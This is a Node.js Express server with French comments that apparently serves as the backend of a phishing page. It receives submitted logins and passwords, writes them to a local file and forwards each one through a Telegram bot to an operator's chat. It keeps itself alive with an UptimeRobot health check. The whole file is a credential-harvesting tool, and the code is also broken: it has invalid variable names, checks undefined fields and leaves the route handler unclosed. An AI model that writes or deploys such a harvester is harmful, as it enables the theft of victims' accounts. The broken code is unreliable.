const express = require("express");
const fs = require("fs");
const path = require("path");
const cors = require("cors");
const axios = require("axios");

const app = express();
const PORT = process.env.PORT || 10000;

/* =======================
   🔐 TELEGRAM CONFIG
   👉 À mettre dans Render > Environment
   ======================= */
const TELEGRAM_TOKEN = process.env.TELEGRAM_TOKEN; // ex: 123456:ABC-DEF...
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID; // ex: 8585623503

// Middleware
app.use(cors());
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// Dossier statique (HTML/CSS/images)
app.use(express.static(path.join(__dirname, "public"))); 
// ⚠️ adapte "public" si ton dossier s'appelle autrement

// Fichier de sauvegarde
const FILE = path.join(__dirname, "data.txt");

// Endpoint santé (pour UptimeRobot)
app.get("/", (req, res) => {
  res.status(200).send("OK");
});

// Réception du formulaire
app.post("/submit", async (req, res) => {
  const { Identifiant, mot de passe } = req.body;

  console.log("📥 DONNÉES REÇUES :", req.body);

  if (!email || !phone) {
    console.log("❌ Données manquantes");
    return res.sendStatus(400);
  }

  // Sauvegarde locale
  const line = `IDENTIFIANT: ${Identifiant} | MOT DE PASSE: ${Mot de passe}\n`;
  fs.appendFileSync(FILE, line);

  // Envoi Telegram (si configuré)
  if (TELEGRAM_TOKEN && TELEGRAM_CHAT_ID) {
    try {
      await axios.post(
        `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`,
        {
          chat_id: TELEGRAM_CHAT_ID,
          text: `📩 Nouvelle entrée\n📧 Identifiant: ${Identifiant}\n📞 Mot de passe: ${mot de passe}`
        }
      );
      console.log("✅ Message Telegram envoyé");
    } catch (error) {
      console.log("❌ Erreur Telegram :", error.response?.data || error.message);
    }
  } else {
    console.log("ℹ️ Telegram non configuré (variables manquantes)");
  }

  // Redirection après envoi (optionnelle)
  res.send("Informations envoyées avec succès");

// Lancement du serveur
app.listen(PORT, () => {
  console.log("✅ Serveur online sur le port " + PORT);
});
      
